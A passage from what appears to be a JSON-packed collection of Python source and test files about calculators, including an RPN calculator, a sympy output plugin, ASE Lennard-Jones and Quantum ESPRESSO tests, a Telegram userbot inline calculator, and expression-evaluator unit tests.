num_2,\"*\",100, \" = \",num_1/num_2*100) \nelif calc == '**':\n    print (num_1, \" ** \", num_2, \" = \",num_1**num_2)  \nelif calc=='sin':\n    print(math.sin(radians(num_1)))\nelif calc=='cos':\n    print(math.cos(radians(num_1)))\nelif calc=='tan':\n    print(math.tan(radians(num_1)))\nelif calc=='sinh':\n    print(math.sinh(radians(num_1)))\nelif calc=='tanh':\n    print(math.tanh(radians(num_1)))\nelif calc=='cosh':\n    print(math.cosh(radians(num_1)))\nelif calc=='asin':\n    print(math.asin(radians(num_1)))\nelif calc=='acos':\n    print(math.acos(radians(num_1)))\nelif calc=='atan':\n    print(math.atan(radians(num_1)))\nelif calc=='asinh':\n    print(math.asinh(radians(num_1)))\nelif calc=='acosh':\n    print(math.acosh(radians(num_1)))\nelif calc=='atanh':\n    print(math.atanh(radians(num_1)))\nelif calc=='log':\n    print(math.log(num_1))\nelif calc=='exp':\n    print(math.exp(num_1))\nelif calc=='sqrt':\n    print(math.sqrt(num_1))\nelif calc=='degrees':\n    print(math.degrees(num_1))\nelif calc=='radians':\n    print(math.radians(num_1))\nelif calc=='factorial':\n    print(math.factorial(num_1))\nelif calc=='cbrt':\n    print(np.cbrt(num_1))\nelse:    \n   print (\"This is an invalid input\") ", "430": "\"\"\"\nCMPS 2200  Recitation 2\n\"\"\"\n\n### the only imports needed are here\nfrom cmath import e\nimport tabulate\nimport time\n###\nimport math\n\ndef simple_work_calc(n, a, b):\n\t# TODO\n\tif n == 1:\n\t\treturn 1\n\telif n == 0:\n\t\treturn 0\n\telse: \n\t\treturn a*simple_work_calc(n//b, a, b) + n\n\ndef test_simple_work():\n\tassert simple_work_calc(10, 2, 2) == 36 #TODO\n\tassert simple_work_calc(20, 3, 2) == 230 #TODO\n\tassert simple_work_calc(30, 4, 2) == 650 #TODO\n\t# Additional three cases:\n\tassert simple_work_calc(1, 2, 2) == 1\n\tassert simple_work_calc(40, 2, 3) == 90\n\tassert simple_work_calc(50, 4, 3) == 258\n\n\ndef work_calc(n, a, b, f):\n\t# TODO\n\tif n == 1:\n\t\treturn 1\n\telif n == 0:\n\t\treturn 0\n\telse:\n\t\treturn a*work_calc(n//b, a, b, f) + f(n)\n\ndef span_calc(n, a, b, f):\n\t# TODO\n\tif n== 1:\n\t\treturn 1\n\telif n == 0:\n\t\treturn 0\n\telse:\n\t\treturn span_calc((n//b), a, b, f) + f(n)\n\t\n\ndef test_work():\n\tassert work_calc(10, 2, 2,lambda n: 1) == 15 #TODO\n\tassert work_calc(20, 1, 2, lambda n: n*n) == 530 #TODO\n\tassert work_calc(30, 3, 2, lambda n: n) == 300 #TODO\n\t# Additional three cases:\n\tassert work_calc(40, 4, 2, lambda n: n+1) == 2477\n\tassert work_calc(50, 2, 4, lambda n: n) == 86\n\tassert work_calc(60, 3, 3, lambda n: n*n) == 5232\n\ndef compare_work(work_fn1, work_fn2, work_fn3, sizes=[10, 20, 50, 100, 1000, 5000, 10000]):\n\t\"\"\"\n\tCompare the values of different recurrences for \n\tgiven input sizes.\n\n\tReturns:\n\tA list of tuples of the form\n\t(n, work_fn1(n), work_fn2(n), ...)\n\t\n\t\"\"\"\n\tresult = []\n\tfor n in sizes:\n\t\t# compute W(n) using current a, b, f\n\t\tresult.append((\n\t\t\tn,\n\t\t\twork_fn1(n),\n\t\t\twork_fn2(n),\n\t\t\twork_fn3(n)\n\t\t\t))\n\treturn result\n\ndef print_results(results):\n\t\"\"\" done \"\"\"\n\tprint(tabulate.tabulate(results,\n\t\t\t\t\t\t\theaders=['n', 'W_1', 'W_2', 'W_3'],\n\t\t\t\t\t\t\tfloatfmt=\".3f\",\n\t\t\t\t\t\t\ttablefmt=\"github\"))\n\ndef test_compare_work():\n\t# curry work_calc to create multiple work\n\t# functions taht can be passed to compare_work\n    \n\t# create work_fn1\n\t# create work_fn2\n\twork_fn1 = lambda n:work_calc(n, 8, 2, lambda n: n**4) # let c be 4 which > log_b(a)\n\twork_fn2 = lambda n:work_calc(n, 8, 2, lambda n: n**2) # let c be 2 which < log_b(a)\n\twork_fn3 = lambda n:work_calc(n, 8, 2, lambda n: n**3) # let c be 3 which = log_b(a)\n\tres = print_results(compare_work(work_fn1, work_fn2, work_fn3))\n\tprint(res)\n\ndef test_compare_span():\n\twork_fn1 = lambda n:span_calc(n, 8, 2, lambda n: 1) # f(n) = 1\n\twork_fn2 = lambda n:span_calc(n, 8, 2, lambda n: math.log(n,e)) # f(n) = logn\n\twork_fn3 = lambda n:span_calc(n, 8, 2, lambda n: n) # f(n) = n\n\tres = print_results(compare_work(work_fn1, work_fn2, work_fn3))\n\tprint(res)\n\t# TODO\n\ntest_compare_span()", "431": "import pytest\n\nfrom assertpy import assert_that\nfrom rpn_calculator import RpnCalculator\n\n\ndef test_push():\n    calc = RpnCalculator()\n\n    calc.push(0)\n\n\n@pytest.mark.parametrize(\n    \"i, j, k, expected\", [(1, 2, 3, 3), (-1, -2, -3, -3), (-1, 0, 1, 1)]\n)\ndef test_push_multiple(i, j, k, expected):\n    calc = RpnCalculator()\n\n    calc.push(i, j, k)\n\n    v = calc.result()\n\n    assert_that(v).is_equal_to(expected)\n\n\ndef test_push_no_values():\n    calc = RpnCalculator()\n\n    calc.push()\n\n\n@pytest.mark.parametrize(\"i, expected\", [(0, 0), (1, 1), (-1, -1)])\ndef test_pop(i, expected):\n    calc = RpnCalculator()\n    calc.push(i)\n\n    v = calc.pop()\n\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\"i, j, expected\", [(0, 1, 1), (3, 2, 2), (-1, -2, -2)])\ndef test_result(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    v = calc.result()\n\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\n    \"i, j, expected\", [(1, 2, [1, 2]), (-1, 1, [-1, 1]), (0, 1, [0, 1])]\n)\ndef test_stack(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    stack = calc.stack()\n\n    assert_that(stack).is_equal_to(expected)\n\n\ndef test_clear():\n    calc = RpnCalculator()\n    calc.push(1, 2)\n\n    assert_that(calc.stack()).is_not_empty()\n\n    calc.clear()\n\n    assert_that(calc.stack()).is_empty()\n\n\n@pytest.mark.parametrize(\"i, j, expected\", [(1, 2, 3), (0, 1, 1), (-1, 1, 0)])\ndef test_add(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    calc.add()\n\n    v = calc.result()\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\"i, j, expected\", [(3, 2, 1), (0, 1, -1), (1, 1, 0)])\ndef test_sub(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    calc.sub()\n\n    v = calc.result()\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\"i, j, expected\", [(1, 2, 2), (-1, 2, -2), (2, 3, 6)])\ndef test_mul(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    calc.mul()\n\n    v = calc.result()\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\"i, j, expected\", [(6, 3, 2), (-10, 5, -2), (9, 3, 3)])\ndef test_div(i, j, expected):\n    calc = RpnCalculator()\n    calc.push(i, j)\n\n    calc.div()\n\n    v = calc.result()\n    assert_that(v).is_equal_to(expected)\n\n\n@pytest.mark.parametrize(\"i, expected\", [(100, 10), (9, 3), (64, 8)])\ndef test_sqrt(i, expected):\n    calc = RpnCalculator()\n    calc.push(i)\n\n    calc.sqrt()\n\n    v = calc.result()\n    assert_that(v).is_equal_to(expected)\n", "432": "import sympy\nfrom symcalc.plugins.output.decimal import OutputDecimal\nfrom tests import TestCalculator, generate_test_values, random_str\n\n\ndef test_plugin_output_decimal_instantiate():\n    OutputDecimal()\n\n\ndef test_plugin_output_decimal_hook():\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_output_decimal_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(OutputDecimal())\n    assert calc.chksym(\"output_decimal\")\n    assert callable(calc.getsym(\"output_decimal\"))\n\n\ndef test_plugin_output_decimal_available():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(OutputDecimal())\n    assert callable(calc.command(\"output_decimal\"))\n\n\ndef test_plugin_output_decimal_check_real():\n    plugin = OutputDecimal()\n\n    for x in generate_test_values(50, False, real=True, complex=False):\n        assert plugin.check_number(str(x))\n    for x in generate_test_values(50, True, real=True, complex=False):\n        assert plugin.check_number(str(x.evalf()))\n\n\ndef test_plugin_output_decimal_check_complex():\n    plugin = OutputDecimal()\n\n    for x in generate_test_values(10, False, real=False, complex=True):\n        assert plugin.check_number(str(x))\n    for x in generate_test_values(10, True, real=False, complex=True):\n        assert plugin.check_number(str(x.evalf()))\n\n\ndef test_plugin_output_decimal_check_invalid():\n    plugin = OutputDecimal()\n    for t in generate_test_values(5, False, real=True, complex=False) + generate_test_values(5, False, real=False, complex=True):\n        assert plugin.check_number(random_str()) is None\n        assert plugin.check_number(f\"{t}*x\") is None\n        assert plugin.check_number(f\"{t/1000}*x\") is None\n        assert plugin.check_number(f\"{random_str()}({t})\") is None\n        assert plugin.check_number(f\"[{t},{t}]\") is None\n        assert plugin.check_number(f\"[{random_str()},{random_str()}]\") is None\n\n\ndef test_plugin_output_decimal_output_real(capfd):\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n\n    for x in generate_test_values(5, False, real=True, complex=False):\n        calc.command(str(x))\n    assert capfd.readouterr().out.count(\"Decimal\") == 0\n\n    for x in generate_test_values(5, True, real=True, complex=False):\n        calc.command(f\"sympify('{str(x)}')\")\n        output = capfd.readouterr().out\n        if isinstance(x, sympy.core.numbers.Integer | sympy.core.numbers.Float):\n            assert \"Decimal\" not in output\n        else:\n            assert \"Decimal\" in output\n\n\ndef test_plugin_output_decimal_output_complex(capfd):\n    return\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n\n    for x in generate_test_values(5, False, real=False, complex=True):\n        calc.command(str(x))\n    assert capfd.readouterr().out.count(\"Decimal\") == 0\n\n    for x in generate_test_values(5, True, real=False, complex=True, include_edge_cases=False):\n        calc.command(f\"sympify('{str(x)}')\")\n        output = capfd.readouterr().out\n        if isinstance(sympy.re(x), sympy.core.numbers.Integer | sympy.core.numbers.Float) and isinstance(sympy.im(x), sympy.core.numbers.Integer | sympy.core.numbers.Float):\n            assert \"Decimal\" not in output\n        else:\n            assert \"Decimal\" in output\n\n\ndef test_plugin_output_decimal_output_expressions(capfd):\n    return\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n    for x in generate_test_values(1, False, real=True, complex=True):\n        calc.command(f\"{str(x)} + {str(x)}\")\n        calc.command(f\"{str(x)} * {str(x)}**2\")\n        calc.command(f\"abs({str(x)}) - 2 * abs({str(x)})\")\n    assert \"Decimal\" not in capfd.readouterr().out\n    for x in generate_test_values(1, True, real=True, complex=True, include_edge_cases=False):\n        calc.command(f\"sympify('{str(x)}') + sympify('{str(x)}')\")\n        calc.command(f\"sympify('{str(x)}') - 2 * sympify('{str(x)}')\")\n        output = capfd.readouterr().out\n        if isinstance(sympy.re(x), sympy.core.numbers.Integer | sympy.core.numbers.Float) and isinstance(sympy.im(x), sympy.core.numbers.Integer | sympy.core.numbers.Float):\n            assert \"Decimal\" not in output\n        else:\n            assert output.count(\"Decimal\") == 2\n\n\ndef test_plugin_output_decimal_output_invalid():\n    plugin = OutputDecimal()\n\n\ndef test_plugin_output_decimal_output_duplicates(capfd):\n    return\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n\n    for x in generate_test_values(5, False, real=False, complex=True):\n        calc.command(str(x))\n    assert capfd.readouterr().out.count(\"Decimal\") == 0\n\n    for x in generate_test_values(3, True, real=False, complex=True, include_edge_cases=True):\n        calc.command(f\"sympify('{str(x)}')\")\n        output = capfd.readouterr().out\n        if isinstance(sympy.re(x), sympy.core.numbers.Integer | sympy.core.numbers.Float) and isinstance(sympy.im(x), sympy.core.numbers.Integer | sympy.core.numbers.Float):\n            assert \"Decimal\" not in output\n        else:\n            assert \"Decimal\" in output\n        calc.command(f\"sympify('{str(x)}')\")\n        assert capfd.readouterr().out.count(\"Decimal\") == 0\n\n\ndef test_plugin_output_decimal_output_real_list_matrix(capfd):\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n\n    for n in range(0, 6):\n        x = []\n        m = None\n        for i in range(n):\n            tv = generate_test_values(5, False, real=True, complex=False)\n            m = min(m, len(tv)) if m is not None else len(tv)\n            x.append(tv)\n\n        if m:\n            for i in range(m):\n                ta = []\n                tb = []\n                for j in range(n):\n                    ta.append(str(x[j][i]))\n                    tb.append(f\"sympify({x[j][i]})\")\n                calc.command(f\"[{','.join(ta)}]\")\n                calc.command(\"0\")\n                calc.command(f\"[{','.join(tb)}]\")\n                calc.command(\"0\")\n            assert capfd.readouterr().out.count(\"Decimal\") == 0\n\n\ndef test_plugin_output_decimal_output_complex_list_matrix():\n    plugin = OutputDecimal()\n\n\ndef test_plugin_output_decimal_output_invalid_list_matrix():\n    plugin = OutputDecimal()\n\n\ndef test_plugin_output_decimal_example(capfd):\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin_and_enable(plugin)\n    calc.command(\"3+3.2j\")\n    assert \"Decimal\" in capfd.readouterr().out\n    calc.command(\"sympify('123/321',rational=True)\")\n    assert \"Decimal\" in capfd.readouterr().out\n    calc.command(\"x=sympify('123/321',rational=True)\")\n    assert \"Decimal\" in capfd.readouterr().out\n\n\ndef test_plugin_output_decimal_enable_switch(capfd):\n    calc = TestCalculator()\n    plugin = OutputDecimal()\n    calc.register_plugin(plugin)\n    assert plugin.setting_name\n    calc.settings[plugin.setting_name] = False\n\n    for x in generate_test_values(2, False, real=True, complex=True):\n        calc.command(str(x))\n    for x in generate_test_values(2, True, real=True, complex=True):\n        calc.command(f\"sympify('{str(x)}')\")\n    assert capfd.readouterr().out.count(\"Decimal\") == 0\n", "433": "import numpy as np\nimport pytest\n\nfrom ase import Atoms\nfrom ase.build import bulk\nfrom ase.calculators.lj import LennardJones\n\n\n# test non-bulk properties\nreference_potential_energy = pytest.approx(-1.0)\n\n\ndef systems_minimum():\n    \"\"\"two atoms at potential minimum\"\"\"\n\n    atoms = Atoms('H2', positions=[[0, 0, 0], [0, 0, 2 ** (1.0 / 6.0)]])\n    calc = LennardJones(rc=1.0e5)\n    atoms.calc = calc\n    yield atoms\n\n    calc = LennardJones(rc=1.0e5, smooth=True)\n    atoms.calc = calc\n    yield atoms\n\n\ndef test_minimum_energy():\n    # testing at the minimum to see if anything is on fire\n    # See https://en.wikipedia.org/wiki/Lennard-Jones_potential\n    # Minimum is at r=2^(1/6)*sigma, and it's -1.\n\n    for atoms in systems_minimum():\n        assert atoms.get_potential_energy() == reference_potential_energy\n        assert atoms.get_potential_energies().sum() == reference_potential_energy\n\n\ndef test_minimum_forces():\n    # forces should be zero\n    for atoms in systems_minimum():\n        np.testing.assert_allclose(atoms.get_forces(), 0, atol=1e-14)\n\n\ndef test_system_changes():\n    # https://gitlab.com/ase/ase/-/merge_requests/1817\n\n    for atoms in systems_minimum():\n        atoms.calc.calculate(atoms, system_changes=['positions'])\n        assert atoms.get_potential_energy() == reference_potential_energy\n\n\ndef test_finite_difference():\n    # ensure that we got the modified forces right\n    h = 1e-10\n    r = 8.0\n    calc = LennardJones(smooth=True, ro=6, rc=10, sigma=3)\n    atoms = Atoms('H2', positions=[[0, 0, 0], [r, 0, 0]])\n    atoms2 = Atoms('H2', positions=[[0, 0, 0], [r + h, 0, 0]])\n    atoms.calc = calc\n    atoms2.calc = calc\n\n    fd_force = (atoms2.get_potential_energy() - atoms.get_potential_energy()) / h\n    force = atoms.get_forces()[0, 0]\n\n    np.testing.assert_allclose(fd_force, force)\n\n\n# test bulk properties\nstretch = 1.5\nreference_force = pytest.approx(1.57190846e-05)\nreference_pressure = pytest.approx(1.473229212e-05)\n\n\ndef systems_bulk():\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    yield atoms\n\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    # somewhat hand-picked parameters, but ok for comparison\n    calc = LennardJones(rc=12, ro=10, smooth=True)\n    atoms.calc = calc\n\n    yield atoms\n\n\ndef test_bulk_energies():\n    # check energies\n\n    for atoms in systems_bulk():\n        assert np.allclose(\n            atoms.get_potential_energy(), atoms.get_potential_energies().sum()\n        )\n        # energies should be equal in this high-symmetry structure\n        assert atoms.get_potential_energies().std() == pytest.approx(0.0)\n\n\ndef test_bulk_forces():\n    for atoms in systems_bulk():\n        # displace atom for 0.03 \\AA\n        atoms.positions[0, 0] += 0.03\n\n        # check forces sum to zero\n        assert np.allclose(atoms.get_forces().sum(axis=0), 0)\n\n        # check reference force\n        assert atoms.get_forces()[0, 0] == reference_force\n\n\ndef test_bulk_stress():\n    # check stress computation for sanity and reference\n    # reference value computed for \"non-smooth\" LJ, so\n    # we only test that\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    stress = atoms.get_stress()\n    stresses = atoms.get_stresses()\n\n    assert np.allclose(stress, stresses.sum(axis=0))\n\n    # check reference pressure\n    pressure = sum(stress[:3]) / 3\n\n    assert pressure == reference_pressure\n", "434": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "435": "import pytest\nfrom ase.build import bulk\nfrom ase.calculators.espresso import EspressoProfile, Espresso\n\n\ndef test_version():\n    txt = \"\"\"\n     Program PWSCF v.6.4.1 starts on  5Aug2021 at 11: 2:26\n\n     This program is part of the open-source Quantum ESPRESSO suite\n    \"\"\"\n    assert EspressoProfile.parse_version(txt) == '6.4.1'\n\n\ndef verify(calc):\n    assert calc.get_fermi_level() is not None\n    assert calc.get_ibz_k_points() is not None\n    assert calc.get_eigenvalues(spin=0, kpt=0) is not None\n    assert calc.get_number_of_spins() is not None\n    assert calc.get_k_point_weights() is not None\n\n\n@pytest.mark.calculator_lite\ndef test_main(espresso_factory):\n    atoms = bulk('Si')\n    atoms.calc = espresso_factory.calc()\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n\n\n@pytest.mark.calculator_lite\ndef test_smearing(espresso_factory):\n    atoms = bulk('Cu')\n    input_data = {'system': {'occupations': 'smearing',\n                             'smearing': 'fermi-dirac',\n                             'degauss': 0.02}}\n    atoms.calc = espresso_factory.calc(input_data=input_data)\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n\n\ndef test_warn_label():\n    with pytest.warns(FutureWarning):\n        Espresso(label='hello')\n\n\ndef test_error_command():\n    with pytest.raises(RuntimeError):\n        Espresso(command='hello')\n", "436": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        